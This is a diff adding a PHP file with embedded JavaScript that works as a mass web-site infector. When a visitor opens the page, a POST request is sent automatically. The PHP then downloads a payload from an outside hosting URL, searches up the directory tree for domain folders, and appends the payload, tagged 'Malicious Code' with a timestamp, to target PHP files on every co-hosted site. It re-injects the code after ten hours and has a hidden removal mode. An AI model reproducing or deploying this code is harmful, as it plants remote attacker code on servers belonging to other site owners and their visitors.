@@ -1,0 +1,162 @@
+<?php
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $payloadUrl = 'https://red-dugong-830992.hostingersite.com/kod3.txt';
+
+    $deleteMode = isset($_GET['deleteke']);
+    $logMode = isset($_GET['logke']);
+
+    if (!$deleteMode) {
+        $payload = file_get_contents($payloadUrl);
+        if (!$payload) {
+            echo json_encode(['status' => 'error', 'message' => 'Payload indirilemedi.']);
+            exit;
+        }
+    } else {
+        $payload = null;
+    }
+
+    function findDomains_v1($startDir)
+    {
+        $currentDir = realpath($startDir);
+        $domains = [];
+
+        while ($currentDir !== '/') {
+            $entries = scandir($currentDir);
+
+            foreach ($entries as $entry) {
+                if ($entry === '.' || $entry === '..') {
+                    continue;
+                }
+
+                $entryPath = $currentDir . DIRECTORY_SEPARATOR . $entry;
+
+                if (is_dir($entryPath) && preg_match('/^[a-zA-Z0-9\-.]+$/', $entry)) {
+                    $domains[] = $entryPath;
+                }
+            }
+
+            $currentDir = dirname($currentDir);
+        }
+
+        return array_unique($domains);
+    }
+
+    function scanAndProcessInDomains($domains, $payload, $deleteMode, $targetFiles)
+    {
+        $results = [];
+        foreach ($domains as $domainDir) {
+            $results = array_merge($results, scanAndProcess($domainDir, $payload, $deleteMode, $targetFiles));
+        }
+        return $results;
+    }
+
+    function adjustPhpTags($fileContents, $payload)
+    {
+        $utcTimestamp = gmdate('Y-m-d H:i:s');
+        $maliciousCode = "/* Malicious Code: $utcTimestamp */\n$payload";
+
+        if (preg_match('/<\?php/', $fileContents)) {
+            if (!preg_match('/\?>\s*$/', $fileContents)) {
+                $fileContents .= "\n?>";
+            }
+        } else {
+            $fileContents = "<?php\n" . $fileContents;
+        }
+
+        return $fileContents . "\n\n" . $maliciousCode;
+    }
+
+    function scanAndProcess($directory, $payload, $deleteMode, $targetFiles)
+    {
+        $files = scandir($directory);
+        $results = [];
+        foreach ($files as $file) {
+            if ($file === '.' || $file === '..') {
+                continue;
+            }
+
+            $filePath = $directory . DIRECTORY_SEPARATOR . $file;
+
+            try {
+                if (is_dir($filePath)) {
+                    $results = array_merge($results, scanAndProcess($filePath, $payload, $deleteMode, $targetFiles));
+                } elseif (in_array(basename($filePath), $targetFiles)) {
+                    $fileContents = @file_get_contents($filePath);
+
+                    if ($fileContents === false) {
+                        $results[] = ['file' => $filePath, 'status' => 'error', 'message' => 'Dosya okunamadı.'];
+                        continue;
+                    }
+
+                    if ($deleteMode) {
+                        if (strpos($fileContents, '/* Malicious Code */') !== false) {
+                            $cleanedContents = preg_replace('/\n\n\/\* Malicious Code.*$/s', '', $fileContents);
+                            if (@file_put_contents($filePath, $cleanedContents)) {
+                                $results[] = ['file' => $filePath, 'status' => 'success', 'message' => 'Kod başarıyla kaldırıldı.'];
+                            } else {
+                                $results[] = ['file' => $filePath, 'status' => 'error', 'message' => 'Kod kaldırılamadı.'];
+                            }
+                        } else {
+                            $results[] = ['file' => $filePath, 'status' => 'skipped', 'message' => 'Kod bulunamadı.'];
+                        }
+                    } else {
+                        if (preg_match('/\/\* Malicious Code: (.*?) \*\//', $fileContents, $matches)) {
+                            $lastUpdate = strtotime($matches[1]);
+                            $currentUtc = time();
+
+                            if (($currentUtc - $lastUpdate) < 36000) {
+                                $results[] = ['file' => $filePath, 'status' => 'skipped', 'message' => 'Kod zaten güncel.'];
+                                continue;
+                            }
+
+                            $fileContents = preg_replace('/\n\n\/\* Malicious Code.*$/s', '', $fileContents);
+                        }
+
+                        $adjustedContents = adjustPhpTags($fileContents, $payload);
+                        if (@file_put_contents($filePath, $adjustedContents)) {
+                            $results[] = ['file' => $filePath, 'status' => 'success', 'message' => 'Kod başarıyla eklendi.'];
+                        } else {
+                            $results[] = ['file' => $filePath, 'status' => 'error', 'message' => 'Kod eklenemedi.'];
+                        }
+                    }
+                }
+            } catch (Exception $e) {
+                $results[] = ['file' => $filePath, 'status' => 'error', 'message' => $e->getMessage()];
+            }
+        }
+        return $results;
+    }
+
+    $startDir = __DIR__;
+    $targetFiles = ['test1.php', 'test2.php', 'test3.php'];
+    $domains = findDomains_v1($startDir);
+    $results = scanAndProcessInDomains($domains, $payload, $deleteMode, $targetFiles);
+
+    echo json_encode($results);
+    exit;
+}
+?>
+
+
+<script>
+window.addEventListener('load', function () {
+    if (!window.started) { // Sadece bir kez çalıştırmayı garantileyin
+        window.started = true;
+        const logMode = new URLSearchParams(window.location.search).has('logke');
+
+        fetch(window.location.href, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' }
+        })
+        .then(response => response.json())
+        .then(data => {
+            data.forEach(result => {
+                const statusColor = result.status === 'success' ? 'green' : result.status === 'error' ? 'red' : 'orange';
+            });
+        })
+        .catch(error => console.error("Hata:", error));
+    }
+});
+
+</script>
+
